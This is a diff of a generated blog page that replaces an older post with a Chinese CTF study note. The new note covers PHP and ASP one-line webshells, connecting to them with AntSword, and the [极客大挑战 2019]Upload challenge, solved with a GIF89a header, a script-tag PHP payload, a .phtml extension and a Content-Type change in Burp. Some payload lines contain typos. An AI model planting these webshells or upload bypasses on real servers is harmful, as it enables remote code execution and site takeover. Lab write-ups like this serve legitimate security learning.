@@ -4,11 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间), ryz">
-    <meta name="description" content="2023-10-23写wp的一些该学的web任意命令执行 文件上传 挂马
-pwnpwn一直很玄学 不是完完全全了解机理 那些什么rsp rdp也不是完全了解 但能把题目做出来
-cryptorsa加密算法 理论可以破解
-这在后面做软件逆向数据">
+    <meta name="keywords" content="Thu Oct 26 2023 08:00:00 GMT+0800 (中国标准时间), ryz">
+    <meta name="description" content="WEB–Trojans一句话木马（判断是否可回弹）&amp;lt;?php phpinfo();?&gt;				#显示php版本等信息 &amp;lt;%execute(request(&#34;value&#34;))%&gt;	#字符数少 常用
+
+
+
+
+eval()函数定义和用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@ cryptorsa加密算法 理论可以破解
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间) | ryz</title>
+    <title>Thu Oct 26 2023 08:00:00 GMT+0800 (中国标准时间) | ryz</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -225,12 +227,12 @@ cryptorsa加密算法 理论可以破解
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间)</h1>
+                    <h1 class="description center-align post-title">Thu Oct 26 2023 08:00:00 GMT+0800 (中国标准时间)</h1>
                 </div>
             </div>
         </div>
@@ -252,9 +254,13 @@ cryptorsa加密算法 理论可以破解
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/WEB-Trojans/">
+                                <span class="chip bg-color">WEB-Trojans</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -266,7 +272,7 @@ cryptorsa加密算法 理论可以破解
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-10-23
+                    2023-10-26
                 </div>
                 
 
@@ -295,76 +301,132 @@ cryptorsa加密算法 理论可以破解
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="2023-10-23"><a href="#2023-10-23" class="headerlink" title="2023-10-23"></a>2023-10-23</h1><h2 id="写wp的一些该学的"><a href="#写wp的一些该学的" class="headerlink" title="写wp的一些该学的"></a>写wp的一些该学的</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>任意命令执行 文件上传 挂马</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>pwn一直很玄学 不是完完全全了解机理 那些什么rsp rdp也不是完全了解 但能把题目做出来</p>
-<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><p>rsa加密算法 理论可以破解</p>
-<p>这在后面做软件逆向数据处理的时候可能用的到</p>
-<p>还有密码对照表 结尾是&#x3D;的那种</p>
-<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>渗透有意思 没环境玩啊</p>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>那些漏洞 可以尝试自己搭一个环境注入看看 在本地环回接口开个服务？</p>
-<h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>那些开了保护的怎么去除</p>
-<h2 id="电脑搭载安卓系统"><a href="#电脑搭载安卓系统" class="headerlink" title="电脑搭载安卓系统"></a>电脑搭载安卓系统</h2><p>wp写完来弄</p>
-<h2 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h2><p>还是要写个脚本把他的目录改正啊 每次要修改以前的文章就很麻烦</p>
-<h3 id="目录修正脚本"><a href="#目录修正脚本" class="headerlink" title="目录修正脚本"></a>目录修正脚本</h3><h4 id="typora-hexo设置"><a href="#typora-hexo设置" class="headerlink" title="typora&#x2F;hexo设置"></a>typora&#x2F;hexo设置</h4><ul>
-<li>配置typora文件保存位置为&#x2F;${filename} 即与当前正在编辑的文件名相同的同级文件夹下</li>
-<li>对所有都应用</li>
-<li>优先使用相对路径</li>
-<li>hexo根目录 _config.yml–post_asset_folder false改为true</li>
-</ul>
-<h4 id="开发插件"><a href="#开发插件" class="headerlink" title="开发插件"></a>开发插件</h4><p>创建文件夹hexo-asset-img 初始化npm包</p>
-<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> log <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'hexo-log'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token string-property property">'debug'</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string-property property">'slient'</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <h1 id="WEB–Trojans"><a href="#WEB–Trojans" class="headerlink" title="WEB–Trojans"></a>WEB–Trojans</h1><h2 id="一句话木马（判断是否可回弹）"><a href="#一句话木马（判断是否可回弹）" class="headerlink" title="一句话木马（判断是否可回弹）"></a>一句话木马（判断是否可回弹）</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>				#显示php版本等信息 &lt;%execute(request("value"))%>	#字符数少 常用
+</code></pre>
 
-<span class="token comment">/**
- * md文件返回 true
- * @param &#123;*&#125; data 
- */</span>
-<span class="token keyword">function</span> <span class="token function">ignore</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token comment">// TODO: 好奇怪，试了一下, md返回true, 但却需要忽略 取反!</span>
-    <span class="token keyword">var</span> source <span class="token operator">=</span> data<span class="token punctuation">.</span>source<span class="token punctuation">;</span>
-    <span class="token keyword">var</span> ext <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>source<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">'md'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
 
-<span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">var</span> reverseSource <span class="token operator">=</span> data<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">var</span> fileName <span class="token operator">=</span> reverseSource<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> reverseSource<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token comment">// ![example](postname/example.jpg)  -->  &#123;% asset_img example.jpg example %&#125;</span>
-    <span class="token keyword">var</span> regExp <span class="token operator">=</span> <span class="token function">RegExp</span><span class="token punctuation">(</span><span class="token string">"!\[(.*?)\]\("</span> <span class="token operator">+</span> fileName <span class="token operator">+</span> <span class="token string">'/(.+?)\)'</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment">// hexo g</span>
-    data<span class="token punctuation">.</span>content <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regExp<span class="token punctuation">,</span> <span class="token string">"&#123;% asset_img $2 $1 %&#125;"</span><span class="token punctuation">,</span><span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p>定义和用法</p>
+<p>eval() 函数把字符串按照 PHP 代码来计算。</p>
+<p>该字符串必须是合法的 PHP 代码，且必须以<strong>分号</strong>结尾。</p>
+<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
+<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
+<h4 id="一句话木马工作原理"><a href="#一句话木马工作原理" class="headerlink" title="一句话木马工作原理"></a>一句话木马工作原理</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
 
-    <span class="token comment">// log.info(`hexo-asset-img: filename: $&#123;fileName&#125;, title: $&#123;data.title.trim()&#125;`);</span>
-    
-    <span class="token keyword">return</span> data<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
+<p> 这是php的一句话后门中最普遍的一种。它的工作原理是：<br> 首先存在一个名为<code>shell</code>的变量，<code>shell</code>的取值为HTTP的POST方式。Web服务器对<code>shell</code>取值以后，然后通过eval()函数执行<code>shell</code>里面的内容。</p>
+<p>可以搭一个本地站点 进行测试</p>
+<p><strong>eval前面的@是什么作用呢</strong></p>
+<h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h3><p>在网站根目录 新建一个webshell.php 一句话:</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token operator">></span></span></code></pre>
 
-hexo<span class="token punctuation">.</span>extend<span class="token punctuation">.</span>filter<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'before_post_render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ignore</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">action</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<img src="/2023/10/26/2023-10-26/image-20231027011359997.png" class="" title="提交POST数据结果">
 
-<p>再json的最后还需加上</p>
-<pre class="language-json" data-language="json"><code class="language-json">dependencies<span class="token operator">:</span><span class="token punctuation">&#123;</span>
-<span class="token property">"hexo-asset-img"</span><span class="token operator">:</span><span class="token string">"1.0.0"</span>
-<span class="token punctuation">&#125;</span></code></pre>
+<p>用antsword（妈蛋中文打不出来）</p>
+<img src="/2023/10/26/2023-10-26/image-20231027012102136.png" class="" title="image-20231027012102136">
 
-<p>好像是配置包依赖</p>
-<p> json的语言 不懂</p>
-<p>还有使用hexo时还是从git-cmd中进</p>
-<p>从cmd中hexo d时推送不成功 可能是环境没有集成</p>
-<p>注意路径生成 源代码可能还需根据实际版本生成的路径进行修改</p>
-<p>最后</p>
-<pre class="language-none"><code class="language-none">npm install hexo-asset-img</code></pre>
+<p>antsword原理可以参考这篇文章<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15878568/5955342">https://blog.51cto.com/u_15878568/5955342</a></p>
+<p>抓包来看</p>
+<p>antsword进阶参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/M0x1n/p/antsword.html">https://www.cnblogs.com/M0x1n/p/antsword.html</a></p>
+<p>还有无意翻到如何反制坏人<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64973687/article/details/129934482">https://blog.csdn.net/qq_64973687/article/details/129934482</a></p>
+<h2 id="绕过waf验证–一句话的多种变形"><a href="#绕过waf验证–一句话的多种变形" class="headerlink" title="绕过waf验证–一句话的多种变形"></a>绕过waf验证–一句话的多种变形</h2><p>这是个大的话题 先放在这 以后会慢慢积累</p>
+<p>waf验证应该属于后端验证 所以在绕过上可以和前端绕过做个合并</p>
+<h2 id="ANTSWORD学习"><a href="#ANTSWORD学习" class="headerlink" title="ANTSWORD学习"></a>ANTSWORD学习</h2><h3 id="入门–Knife"><a href="#入门–Knife" class="headerlink" title="入门–Knife"></a>入门–Knife</h3><img src="/2023/10/26/2023-10-26/image-20231027013421150.png" class="" title="image-20231027013421150">
 
-<p>不安装无法运行</p>
-<p>tido基本能运作 但好像不能自动发邮件</p>
-<p>文件上传！网盘？</p>
-<h3 id="typora超链接"><a href="#typora超链接" class="headerlink" title="typora超链接"></a>typora超链接</h3><p><a>标签实现页内跳转</p>
-<pre class="language-markdown" data-language="markdown"><code class="language-markdown"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>					添加锚点
-[我要跳了！]（#111）</code></pre>
+<p>AntSword的password就是传入的变量名</p>
+<p>因此直接连接</p>
+<p>在终端下cat &#x2F;flag 拿到flag</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><img src="/2023/10/26/2023-10-26/image-20231027014311946.png" class="" title="image-20231027014311946">
 
+<p>视频好看！下载！</p>
+<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>等做完把subsystem调通装个浏览器嗅探就行</p>
+<img src="/2023/10/26/2023-10-26/image-20231027024906296.png" class="" title="image-20231027024906296">
+
+<p>好的 装不上去</p>
+<p>f12开发者模式 可以看到是get了一个地址的视频</p>
+<img src="/2023/10/26/2023-10-26/image-20231027025149890.png" class="" title="image-20231027025149890">
+
+<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>把一句话木马扔在s&#x2F;php中</p>
+<p>提交一句话显示</p>
+<img src="/2023/10/26/2023-10-26/image-20231027015357578.png" class="" title="image-20231027015357578">
+
+<p>文件格式不对 改文件格式</p>
+<img src="/2023/10/26/2023-10-26/image-20231027015456464.png" class="" title="image-20231027015456464">
+
+<p>被看出来了！[typora打表情包是啥来着]</p>
+<p>是::</p>
+<p>:wave:</p>
+<p>:stuck_out_tongue_closed_eyes:</p>
+<p>对&lt;?有过滤</p>
+<p>换一种写法</p>
+<pre class="language-none"><code class="language-none">&lt;%execute(request(&quot;ryz&quot;))%&gt;</code></pre>
+
+<p>这次居然是这样的</p>
+<img src="/2023/10/26/2023-10-26/image-20231027021000340.png" class="" title="image-20231027021000340">
+
+<p>看来还检测文件头</p>
+<p>ok 看来misc的知识得重拾</p>
+<p>改文件头当然行 但wp里给的直接加一个GIF89a更为方便</p>
+<pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">GIF89a
+&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ryz&#39;&#39;]);&lt;&#x2F;script&gt; 
+</code></pre>
+
+<img src="/2023/10/26/2023-10-26/image-20231027022217539.png" class="" title="上传成功">
+
+<h4 id="修改文件后缀"><a href="#修改文件后缀" class="headerlink" title="修改文件后缀"></a>修改文件后缀</h4><p>由于请求包限制Content-Type为image&#x2F;jpeg，而image&#x2F;jpeg文件不可被解析。此时需要绕过后缀，常见绕过后缀的文件格式有<code>php,php3,php4,php5,phtml,pht</code></p>
+<img src="/2023/10/26/2023-10-26/image-20231027022821838.png" class="" title="image-20231027022821838">
+
+<p>phtml  –    :ok:</p>
+<p>小知识&#x2F;upload存放上传的文件</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023008918.png" class="" title="image-20231027023008918">
+
+<p>:smile:好多前人的作品</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023122160.png" class="" title="image-20231027023122160">
+
+<p>确定路径</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023248232.png" class="" title="image-20231027023248232">
+
+<p>直接访问得到</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023300719.png" class="" title="image-20231027023300719">
+
+<p>没有解析啊</p>
+<p>那应该是&lt;%无法在中间件解析 因此改成wp的那种形式</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">GIF89a
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ryz'</span>'<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> </code></pre>
+
+<img src="/2023/10/26/2023-10-26/image-20231027023418587.png" class="" title="image-20231027023418587">
+
+<p>直接在burp中修改即可</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023453941.png" class="" title="image-20231027023453941">
+
+<p>此时返回空白 证明被成功解析</p>
+<p>（上面在放p</p>
+<p>前面antsword连接时报错</p>
+<p>回去检查时发现多打了一个‘ 导致出错 无法解析</p>
+<p>不过也是返回空白</p>
+<p>这才是正确的返回结果</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023705770.png" class="" title="return">
+
+
+
+<img src="/2023/10/26/2023-10-26/image-20231027023735083.png" class="" title="image-20231027023735083">
+
+<p>测试成功！</p>
+<img src="/2023/10/26/2023-10-26/image-20231027023806212.png" class="" title="image-20231027023806212">
+
+<p>根目录拿到flag</p>
+<p>好！去整subsystem</p>
+<h1 id="ADD–CRYPTO-图片头"><a href="#ADD–CRYPTO-图片头" class="headerlink" title="ADD–CRYPTO-图片头"></a>ADD–CRYPTO-图片头</h1><p>PNG         89 50 4F 47         ？PNG</p>
+<h1 id="ADD–博客美化"><a href="#ADD–博客美化" class="headerlink" title="ADD–博客美化"></a>ADD–博客美化</h1><h2 id="轮播"><a href="#轮播" class="headerlink" title="轮播"></a>轮播</h2><p>想把轮播换成视频 失败 明天试试看能不能直接部署到github然后get一下</p>
+<h2 id="换主题"><a href="#换主题" class="headerlink" title="换主题"></a>换主题</h2><p>换了主题tido不知道有没有内嵌</p>
+<p>不过可以先换个看看</p>
+<p>还有就是有些文章似乎有丢失 还有图片路径因为脚本改过了 要重新修正</p>
+<pre class="language-none"><code class="language-none">git clone 主题httpslink themes&#x2F;主题名称</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu">https://github.com/anzhiyu-c/hexo-theme-anzhiyu</a></p>
+<p>晚上github访问是真慢 等明天早上再看</p>
+<p>睡！</p>
+<p>–3：11</p>
+<h2 id="访问速度慢–CDN加速"><a href="#访问速度慢–CDN加速" class="headerlink" title="访问速度慢–CDN加速"></a>访问速度慢–CDN加速</h2><p>这个先暂留</p>
 
                 
             </div>
@@ -391,7 +453,7 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ybjryz.github.io/2023/10/23/2023-10-23/">http://ybjryz.github.io/2023/10/23/2023-10-23/</a>
+                    <a href="http://ybjryz.github.io/2023/10/26/2023-10-26/">http://ybjryz.github.io/2023/10/26/2023-10-26/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -428,7 +490,11 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/WEB-Trojans/">
+                                    <span class="chip bg-color">WEB-Trojans</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -476,13 +542,13 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/10/24/2023-10-24/">
+                <a href="/2023/10/27/typora%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -493,7 +559,7 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-27
                         </span>
                         <span class="publish-author">
                             
@@ -513,13 +579,13 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/10/21/2023-10-21/">
+                <a href="/2023/10/24/2023-10-24/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Sat Oct 21 2023 08:00:00 GMT+0800 (中国标准时间)">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)">
                         
-                        <span class="card-title">Sat Oct 21 2023 08:00:00 GMT+0800 (中国标准时间)</span>
+                        <span class="card-title">Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -530,7 +596,7 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-24
                             </span>
                         <span class="publish-author">
                             
@@ -539,14 +605,6 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%AE%89%E5%85%A8-%E5%A4%A7%E6%9D%82%E7%83%A9/">
-                        <span class="chip bg-color">安全-大杂烩</span>
-                    </a>
-                    
                 </div>
                 
             </div>
